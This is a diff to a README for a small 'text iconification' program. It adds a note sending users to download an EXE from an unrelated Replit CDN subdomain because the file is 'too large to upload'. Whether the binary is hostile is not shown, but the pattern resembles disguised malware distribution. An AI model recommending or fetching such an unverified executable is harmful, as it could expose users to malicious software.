@@ -3,6 +3,7 @@ An open-source python-pure program that allows text iconification!
 
 ## How to use?
 Open the EXE, insert an emoji's name, insert some text and voila!
+NOTE: The new EXE file is too large to upload here, so have a [https://cdn.error40448.repl.co/iconify.exe](Replit file)
 
 Example of usage:
 
